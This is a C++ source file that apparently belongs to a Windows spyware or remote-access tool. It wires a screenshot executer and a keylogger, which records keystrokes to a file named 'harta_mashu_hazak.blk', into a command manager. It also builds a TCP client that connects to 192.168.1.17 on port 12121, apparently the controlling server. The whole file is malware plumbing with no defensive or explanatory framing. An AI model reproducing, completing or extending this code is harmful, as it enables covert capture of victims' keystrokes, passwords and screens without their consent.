#include "utils/builders.h"

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"
#include "methods/keylogger/Keylogger.h"
#include "methods/keylogger/KeysRecorder.h"
#include "networking/WinsockTCPClient.h"
#include "stl/unique.h"


std::unique_ptr<command::ICommandExecuter>
utils::builders::BuildScreenshotExecuter()
{
    return ( std::make_unique<command::ScreenshotExecuter>(1) );
}

std::unique_ptr<command::ICommandExecuter>
utils::builders::BuildKeyloggerExecuter()
{
    auto impl = std::make_unique<methods::keylogger::KeysRecorder>(
        "harta_mashu_hazak.blk");

    return ( std::make_unique<command::KeyloggerExecuter>(
        2, methods::keylogger::Keylogger(impl.release())) );
}

std::unique_ptr<command::CommandManager>
utils::builders::BuildManager()
{
    auto dispatcher = std::make_unique<command::CommandManager>();

    dispatcher->Add(BuildScreenshotExecuter().release());
    dispatcher->Add(BuildKeyloggerExecuter().release());

    return ( dispatcher );
}

std::unique_ptr<networking::WinsockTCPClient>
utils::builders::BuildClient()
{
    return ( std::make_unique<networking::WinsockTCPClient>("192.168.1.17", 12121) );
}

